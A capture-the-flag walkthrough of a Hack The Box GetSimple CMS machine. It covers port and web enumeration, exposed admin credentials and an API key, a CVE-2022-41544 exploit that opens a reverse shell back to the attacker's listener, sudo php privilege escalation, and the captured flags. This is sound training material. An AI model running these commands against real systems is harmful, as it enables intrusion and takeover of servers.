# Scanning

**Initial Scanning with Rustscan**
```sh
rustscan -a 10.129.47.83 --ulimit 5000 > ./Logs/Initial_Rustscan ; cat ./Logs/Initial_Rustscan
```
![[Pasted image 20240606075345.png]]
Only 2 ports open.
22 - SSH -> usual open port, better to skip for this box than wasting time.
[[CTF Challenges/Hack The Box/02 Getting Started/Logs/2 Enumeration/80 - HTTP]] -> Web service running with Apache server, gotta enumerate more

**Aggressive open ports scan with nmap**
```sh
nmap -A -T4 -v -p- 10.129.47.83 --open -oA ./Logs/Aggressive_nmap
```
![[Pasted image 20240606080627.png]]

**Nikto scan for web server vulnerabilities**
```sh
nikto -host 10.129.47.83 -output ./Logs/80-nikto.txt
```

+ Server: Apache/2.4.41 (Ubuntu)
+ http-title: Welcome to GetSimple! - gettingstarted
+ http supported methods: GET HEAD POST OPTIONS
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-Content-Type-Options header is not set.
+ /robots.txt: Entry for '/admin/'
+ Apache/2.4.41 appears to be outdated
+ /sitemap.xml: This gives a nice listing of the site content.
+ /admin/: This might be interesting.
+ /data/: Directory indexing found.
+ /readme.txt: This might be interesting.
+ /LICENSE.txt: License file found may identify site software.

---
# Enumeration
## 80 - HTTP Enumeration

### Walkaround

```sh
nmap -sC -sV -v -p 80 10.129.47.83 -oA ./Logs/80_Scriptscan_nmap
```
![[Pasted image 20240606081826.png]]

```url
http://10.129.47.83/
```
![[Pasted image 20240606080100.png]]
Nothing sensitive found in webpage.

```url
view-source:http://10.129.47.83/
```
![[Pasted image 20240606080302.png]]
> [!INFO]
> Identified `Get Simple` as the CMS used for the Web application from page source.

**Directory bruteforcing with Gobuster**
```sh
gobuster dir -u http://10.129.47.83 -w /usr/share/wordlists/dirb/common.txt -o ./Logs/80-Gobuster -t 30
```
![[Pasted image 20240606082205.png]]

**Fingerprinting using WhatWeb**
```sh
whatweb --no-errors http://10.129.47.83 -v > ./Logs/80-Whatweb 
```

---
### Enumeration Findings
***Server: Apache/2.4.41 (Ubuntu)***
 [CVE-2021-41773 -> Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50383)
```sh
searchsploit apache 2.4.41 
```
![[Pasted image 20240606083605.png]]

***http-title: Welcome to GetSimple! - gettingstarted***
- [ ] [CVE - 2022-41544 -> GetSimple CMS v3.3.16 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/51475)
- [ ] [Metasploit -> GetSimpleCMS PHP File Upload Vulnerability](https://www.rapid7.com/db/modules/exploit/unix/webapp/get_simple_cms_upload_exec/)
- [ ] [CVE - # - # -> Getsimple CMS 3.3.10 - Arbitrary File Upload](https://www.exploit-db.com/exploits/40008)
- [ ] Metasploit -> 0  exploit/unix/webapp/get_simple_cms_upload_exec
- [ ] Metasploit -> 1  exploit/multi/http/getsimplecms_unauth_code_exec
![[Pasted image 20240606091615.png]]

***/robots.txt: Entry for '/admin/'*** and ***/admin/: This might be interesting.***
![[Pasted image 20240606085738.png]]
 ![[Pasted image 20240606090000.png]]

***/readme.txt: This might be interesting.***
![[Pasted image 20240606090202.png]]

***/data/: Directory indexing found.***
***/data                 (Status: 301) [Size: 311] [--> http://10.129.47.83/data/]   ***
```url
http://10.129.47.83/data/cache/2a4c6447379fba09620ba05582eb61af.txt
```
![[Pasted image 20240606090604.png]]
>[! Sensitive Information]
>version identified as 3.3.15 for get simple and its old

```url
http://10.129.47.83/data/other/authorization.xml
```
![[Pasted image 20240606090858.png]]
>[!Sensitive Info]
>API key found : 4f399dc72ff8e619e327800f851e9986

```sh
http://10.129.47.83/data/users/admin.xml
```
![[Pasted image 20240606091113.png]]
>[!Sensitive Info]
>Admin username and password hash found
>
>admin
d033e22ae348aeb5660fc2140aec35850c4da997
>admin@gettingstarted.com

![[Pasted image 20240606092548.png]]

---
### Exploitation Checklist
***Server: Apache/2.4.41 (Ubuntu)***
- [ ] [CVE-2021-41773 -> Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50383)

***http-title: Welcome to GetSimple! - gettingstarted***
- [ ] [CVE - 2022-41544 -> GetSimple CMS v3.3.16 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/51475)
- [ ] [Metasploit -> GetSimpleCMS PHP File Upload Vulnerability](https://www.rapid7.com/db/modules/exploit/unix/webapp/get_simple_cms_upload_exec/)
- [ ] [CVE - # - # -> Getsimple CMS 3.3.10 - Arbitrary File Upload](https://www.exploit-db.com/exploits/40008)
- [ ] Metasploit -> 0  exploit/unix/webapp/get_simple_cms_upload_exec
- [ ] Metasploit -> 1  exploit/multi/http/getsimplecms_unauth_code_exec
![[Pasted image 20240606091615.png]]

***Admin Login Page***
```url
http://10.129.47.83/admin/
```
![[Pasted image 20240606090000.png]]

>[! Sensitive Information]
>version identified as 3.3.15 for get simple and its old

>[!Sensitive Info]
>API key found: 4f399dc72ff8e619e327800f851e9986

> [!Sensitive Info]
>admin // d033e22ae348aeb5660fc2140aec35850c4da997
>admin:admin
>admin@gettingstarted.com


![[Pasted image 20240606092548.png]]

---
# Initial Foothold

```sh
nc -nvlp 1612
```
![[Pasted image 20240606101824.png]]

```sh
python3 CVE-2022-41544.py 10.129.47.83 / 10.10.14.79:1612 admin  
```
![[Pasted image 20240606101920.png]]

![[Pasted image 20240606101949.png]]

**Upgrading tty**
![[Pasted image 20240606102223.png]]
![[Pasted image 20240606102332.png]]
>[!FLAG]
>cat user.txt
>7002d65b149b0a4d19132a66feed21d8

---
# Privilege Escalation

```sh
sudo -l
```
![[Pasted image 20240606102449.png]]

```url
https://gtfobins.github.io/gtfobins/php/
```
![[Pasted image 20240606102523.png]]
```sh
CMD="/bin/sh"
sudo php -r "system('$CMD');"
```
![[Pasted image 20240606102918.png]]
![[Pasted image 20240606103608.png]]
>[!FLAG]
>cat root.txt
f1fba6e9f71efb2630e6e34da6387842

---